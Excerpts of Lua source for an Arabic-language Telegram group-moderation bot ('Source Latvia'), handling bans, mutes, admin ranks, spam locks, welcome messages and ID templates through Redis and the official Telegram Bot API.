DevRio:sadd(Latvia..'Rio:BanAll:', user)
...
DevRio:sadd(Latvia..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Latvia..'Rio:MuteAll:', result.id_)
...
DevRio:sadd(Latvia..'Rio:MuteAll:', user)
...
DevRio:srem(Latvia..'Rio:BanAll:', result.sender_user_id_)
DevRio:srem(Latvia..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:srem(Latvia..'Rio:BanAll:', result.id_)
DevRio:srem(Latvia..'Rio:MuteAll:', result.id_)
...
DevRio:srem(Latvia..'Rio:BanAll:', user)
DevRio:srem(Latvia..'Rio:MuteAll:', user)
...
DevRio:setex(Latvia.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevRio:get(Latvia.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevRio:del(Latvia.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevRio:del(Latvia.."Rio:EditDev"..msg.sender_user_id_)
DevRio:set(Latvia.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source Latvia     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevRio:get(Latvia..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevRio:sismember(Latvia..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevRio:sadd(Latvia..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Latvia     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevRio:get(Latvia..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevRio:sismember(Latvia..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevRio:srem(Latvia..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:set('LatviaTeam:'..Latvia..'id:user'..msg.chat_id_,TXT)  
DevRio:setex('LatviaTeam:'..Latvia.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevRio:del(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevRio:incrby(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevRio:set('LatviaTeam:'..Latvia..'ids:user'..msg.chat_id_,TXT)  
DevRio:setex('LatviaTeam:'..Latvia.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevRio:get(Latvia..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Latvia.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(Latvia.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Latvia..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Latvia.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevRio:sadd(Latvia.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevRio:get(Latvia..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(Latvia.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevRio:sadd(Latvia.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevRio:sismember(Latvia.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevRio:set(Latvia..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevRio:smembers(Latvia..'Rio:VipMem:'..msg.chat_id_)
text = "᥀︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..rio)
text = "᥀︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:Managers:'..msg.chat_id_)
text = "᥀︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:Cleaner:'..msg.chat_id_)
text = "᥀︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:Constructor:'..msg.chat_id_)
text = "᥀︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:Owner:'..msg.chat_id_)
text = "᥀︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:BasicConstructor:'..msg.chat_id_)
...
local List = DevRio:smembers(Latvia..'Rio:Muted:'..msg.chat_id_)
...
local List = DevRio:smembers(Latvia..'Rio:Tkeed:'..msg.chat_id_)
text = "᥀︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(Latvia..'Rio:Ban:'..msg.chat_id_)
...
local List = DevRio:smembers(Latvia..'User:Donky:'..msg.chat_id_)
...
local List = DevRio:hkeys(Latvia..'Rio:Filters:'..msg.chat_id_)
text = "᥀︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevRio:smembers(Latvia..'Rio:RioSudo:')
...
local List = DevRio:smembers(Latvia..'Rio:SecondSudo:')
...
local BanAll = DevRio:smembers(Latvia..'Rio:BanAll:')
local MuteAll = DevRio:smembers(Latvia..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevRio:smembers(Latvia..'Rio:SudoBot:')
text = "᥀︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(Latvia..'Rio:Sudos'..v) 
local username = DevRio:get(Latvia..'Save:UserName'..v)
if username then
...
DevRio:sadd(Latvia.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(Latvia.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(Latvia.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(Latvia.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevRio:get(Latvia..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(Latvia..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Latvia..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Latvia..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Latvia..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Latvia..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Latvia..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(Latvia..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Latvia..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Latvia..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Latvia..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Latvia..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Latvia..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(Latvia..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(Latvia..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(Latvia..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(Latvia..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(Latvia..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n᥀︙عدد الكروبات ↫ '..(DevRio:get(Latvia..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(Latvia..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Latvia..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Latvia..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Latvia..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(Latvia..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(Latvia..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(Latvia..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(Latvia..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الحظر العام ↫ '..banall..'\n᥀︙الكتم العام ↫ '..muteall..'\n᥀︙الحظر ↫ '..banned..'\n᥀︙الكتم ↫ '..muted..'\n᥀︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Latvia..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(Latvia..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(Latvia..'Rio:BanAll:',user) DevRio:srem(Latvia..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(Latvia..'Rio:BanAll:',result.id_) DevRio:srem(Latvia..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevRio:set(Latvia.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevRio:set("Latvia:New:id:"..Latvia..msg.sender_user_id_,'LatviaTeam')
return "LatviaTeam"
end
if text and DevRio:get("Latvia:New:id:"..Latvia..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Latvia:New:id:"..Latvia..msg.sender_user_id_)
return false
end
DevRio:del("Latvia:New:id:"..Latvia..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevRio:set(Latvia.."Rio:AllIds:Text",text)
return false
end
...
DevRio:del(Latvia.."Rio:AllIds:Text")
end
end
--     Source Latvia     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙رجائا اتبع التعليمات للتعيين \n᥀︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
DevRio:set("Latvia:New:id:"..Latvia..msg.chat_id_..msg.sender_user_id_,'LatviaTeam')
return "LatviaTeam"
end
if text and Manager(msg) and DevRio:get("Latvia:New:id:"..Latvia..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("Latvia:New:id:"..Latvia..msg.chat_id_..msg.sender_user_id_)
return false
end
DevRio:del("Latvia:New:id:"..Latvia..msg.chat_id_..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الكليشه الجديده', 1, 'md')
DevRio:set(Latvia.."Rio:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف كليشة الايدي")  
DevRio:del(Latvia.."Rio:GpIds:Text"..msg.chat_id_)
end
end
--     Source Latvia     --
if msg.reply_to_message_id_ ~= 0 then
...
function LatviaTeam(extra,rio,success)
...
local msgsday = DevRio:get(Latvia..'Rio:UsersMsgs'..Latvia..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevRio:get(Latvia..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevRio:get(Latvia..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
...
if not DevRio:get(Latvia..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(Latvia..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(Latvia.."Rio:AllIds:Text") then
newpicid = DevRio:get(Latvia.."Rio:AllIds:Text")
...
if not DevRio:get(Latvia.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(Latvia.."Rio:GpIds:Text"..msg.chat_id_)
...
if DevRio:get(Latvia.."Rio:AllIds:Text") then
newallid = DevRio:get(Latvia.."Rio:AllIds:Text")
...
if DevRio:get(Latvia.."Rio:AllIds:Text") then
notpicid = DevRio:get(Latvia.."Rio:AllIds:Text")
...
if not DevRio:get(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التعديل")  
DevRio:set(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
...
DevRio:set(Latvia.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
...
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التكرار بالكتم")  
end
if BasicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevRio:get(Latvia..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(Latvia.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم قفل التثبيت")  
DevRio:set(Latvia..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(Latvia.."Rio:Lock:Pinpin",msg.chat_id_) 
else
...
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevRio:hset(Latvia.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevRio:get(Latvia..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevRio:get(Latvia..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Latvia     --
...
DevRio:setex(Latvia.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(Latvia.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(Latvia.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(Latvia..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevRio:del(Latvia..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Latvia..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(Latvia..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevRio:set(Latvia..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevRio:del(Latvia..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevRio:get(Latvia..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source Latvia     --
if DevRio:get(Latvia..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
